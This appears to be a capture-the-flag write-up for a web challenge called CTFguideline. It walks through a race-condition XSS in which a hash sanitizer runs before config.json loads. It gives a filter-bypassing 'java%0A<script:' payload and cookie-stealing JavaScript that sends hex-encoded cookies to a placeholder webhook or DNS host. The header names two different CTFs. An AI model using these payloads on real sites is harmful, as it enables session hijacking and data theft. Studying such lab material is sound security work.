# CTFguideline — SunShine CTF 2025

> **Room / Challenge:** CTFguideline (Web)

---

## Metadata

- **Author:** `jameskaois`
- **CTF:** WannaGame Championship 2025
- **Challenge:** CTFguideline (web)
- **Target / URL:** `https://ctf.cnsc.com.vn/games/1/challenges?challenge=23`
- **Points:** `967`
- **Solved:** `5`
- **Date:** `09-12-2025`

---

## Goal

Leveraging the Race Condition XSS in the home page, submit to the bot to get the flag.

## My Solution

Visit the home page and view the page source we should find the `script.js` which is the main script for the page:

```javascript
/* ============================================================
   Load config
   ============================================================ */

var config;
fetch("config.json")
  .then((resp) => resp.json())
  .then(async (resp) => {
    config = resp;
    document.body.style.backgroundColor = config.background;
    document.body.style.color = config.text_color;
    await loadContentsList(config);

    if (location.hash.length > 0) (config.skin = "Pane"), initPane(config);
    else {
      const url = new URL(location.href);
      if (url.searchParams.get("doc"))
        (config.skin = "Modern"), initModern(config);
      else (config.skin = "Default"), initDefault(config);
    }
  });

if (location.hash.length > 0) {
  sanitizeHash();
  window.onhashchange = () => loadPaneContent(config);
}
/* ============================================================
   Build navigation list
   ============================================================ */
async function loadContentsList(config) {
  const nav = document.getElementById("nav");
  nav.innerHTML = "";

  config.contents.forEach((file) => {
    const name = file.replace(".html", "");
    nav.innerHTML += `
            <li><a href="#" class="nav-item" data-file="${file}">${name}</a></li>
        `;
  });

  attachNavHandlers(config);
}

/* ============================================================
   Navigation Handlers
   ============================================================ */
function attachNavHandlers(config) {
  document.querySelectorAll(".nav-item").forEach((item) => {
    item.addEventListener("click", (e) => {
      e.preventDefault();
      const file = item.getAttribute("data-file");

      if (config.skin === "Pane") {
        location.hash = file; // Pane uses hash
      } else if (config.skin === "Default") {
        loadDefault(file);
      } else if (config.skin === "Modern") {
        const url = new URL(location.href);
        url.searchParams.set("doc", file);
        location.href = url.toString();
      }
    });
  });
}

/* ============================================================
   Pane Theme — 3 Panel View
   ============================================================ */
function initPane(config) {
  hideAllViewers();
  document.body.classList.add("pane");

  document.getElementById("viewerLeft").style.display = "block";
  document.getElementById("viewerCenter").style.display = "block";
  document.getElementById("viewerRight").style.display = "block";

  loadPaneContent(config);
}

function sanitizeHash() {
  currentHash = location.hash.substring(1);
  if (currentHash) {
    var decodedHash = decodeURIComponent(currentHash);
    var sanitizedHash = decodedHash.replace(/(javascript:|data:|[<>])/gi, "");
    if (decodedHash != sanitizedHash) {
      document.location.hash = encodeURI(sanitizedHash);
    }
  }
}

function loadPaneContent(config) {
  sanitizeHash();
  let file = location.hash.substring(1) || config.default;
  if (file) {
    document.getElementById(
      "viewerLeft"
    ).innerHTML = `<h2>Overview</h2><p>You selected: ${encodeURIComponent(
      file
    )}</p>`;
    url = new URL(location.href);
    if (config) {
      if (!config.load_remote) {
        file = "contents/" + file;
      } else {
        if (!file.startsWith("http://") && !file.startsWith("https://"))
          file = url.origin + url.pathname + "/contents" + file;
      }
    }
    document
      .getElementById("viewerCenter")
      .contentWindow.location.replace(decodeURI(file));
    document.getElementById(
      "viewerRight"
    ).innerHTML = `<h2>Extras</h2><p>Copyright.</p>`;
  }
}

/* ============================================================
   Default Theme
   ============================================================ */
function initDefault(config) {
  hideAllViewers();
  document.body.classList.add("default");

  document.getElementById("viewer").style.display = "block";
  loadDefault(config.default);
}

async function loadDefault(file) {
  const text = await fetch("contents/" + file).then((r) => r.text());
  document.getElementById("viewer").innerHTML = text;
}

/* ============================================================
   Modern Theme
   ============================================================ */
function initModern(config) {
  hideAllViewers();
  document.body.classList.add("modern");

  document.getElementById("viewer").style.display = "block";

  const params = new URLSearchParams(location.search);
  const doc = params.get("doc") || config.default;

  loadModern(doc);
}

async function loadModern(file) {
  const text = await fetch("contents/" + file).then((r) => r.text());
  document.getElementById(
    "viewer"
  ).innerHTML = `<div class="modern-card">${text}</div>`;
}

/* ============================================================
   Helpers
   ============================================================ */
function hideAllViewers() {
  document.querySelectorAll("#viewer, .pane-panel").forEach((el) => {
    el.style.display = "none";
  });
}
```

Also, from this we can find the `config.json`:

```json
{
  "background": "red",
  "text_color": "red",

  "load_remote": false,

  "default": "content1.html",

  "contents": [
    "content1.html",
    "content2.html",
    "content3.html",
    "content4.html",
    "content5.html"
  ]
}
```

This page is vulnerable because we can execute payload before loading the configuration settings. Since here, the script doesn't wait for the `config.json` to load, so initially `config` is just `undefined`:

```javascript
var config;
fetch("config.json").then((resp) => resp.json());
// ...
```

So it just hits this code immediately after the page loads:

```javascript
if (location.hash.length > 0) {
  sanitizeHash();
  window.onhashchange = () => loadPaneContent(config);
}
```

Look at the `sanitizeHash()`:

```javascript
function sanitizeHash() {
  currentHash = location.hash.substring(1);
  if (currentHash) {
    var decodedHash = decodeURIComponent(currentHash);
    var sanitizedHash = decodedHash.replace(/(javascript:|data:|[<>])/gi, "");
    if (decodedHash != sanitizedHash) {
      document.location.hash = encodeURI(sanitizedHash);
    }
  }
}
```

This blocks: `javascript`, `data`, `<`, `>`. When it sees these words it will replace these words, this event will cause the `onhashchange` event to load our payload:

```javascript
window.onhashchange = () => loadPaneContent(config);

function loadPaneContent(config) {
  sanitizeHash();
  let file = location.hash.substring(1) || config.default;
  if (file) {
    document.getElementById(
      "viewerLeft"
    ).innerHTML = `<h2>Overview</h2><p>You selected: ${encodeURIComponent(
      file
    )}</p>`;
    url = new URL(location.href);
    if (config) {
      if (!config.load_remote) {
        file = "contents/" + file;
      } else {
        if (!file.startsWith("http://") && !file.startsWith("https://"))
          file = url.origin + url.pathname + "/contents" + file;
      }
    }
    document
      .getElementById("viewerCenter")
      .contentWindow.location.replace(decodeURI(file));
    document.getElementById(
      "viewerRight"
    ).innerHTML = `<h2>Extras</h2><p>Copyright.</p>`;
  }
}
```

Because at that time `config.json` hasn't been loaded so it will skip the code inside the check `if (config) { ..logic.. }` and execute:

```javascript
document
  .getElementById("viewerCenter")
  .contentWindow.location.replace("javascript:eval(...)");
```

The payload to test:

```
http://challenge:port/#java%0A<script:alert(1)
```

Intentionally add `<` to make the `sanitizeHash()` remove it and trigger `onhashchange`. `%0A` to bypass the second check of `sanitizeHash()` in `loadPaneContent(config)`

The exploit Javascript we need:

```javascript
for (var t = document.cookie, h = "", i = 0; i < t.length; i++)
  h += t.charCodeAt(i).toString(16);
new Image().src = "http://YOUR_SERVER/webhook?c=" + h;
```

For some reason, I cannot use HTTP exfiltration so if you face the same issue try using DNS exfiltration to get the flag:

```javascript
var t = document.cookie;
var h = "";
for (var i = 0; i < t.length; i++) {
  h += t.charCodeAt(i).toString(16);
  if (i % 30 == 29) h += ".";
}
new Image().src = "http://" + h + ".<requestrepo.com>";
```

Base64 encode this and use this payload and submit it in `/bot.html`:

```
http://localhost:2808/#java%0A<script:eval(atob("base64_encoded"))
```

You should received a hex text in the response and decode it to get the flag:

![Guide image](./screenshots/1.png)

Flag: `W1{H4Ve_YOU-Ev3r_5EEn-th15-k1Nd-oF-R@Ce-C0ND1TI0N_????8}`
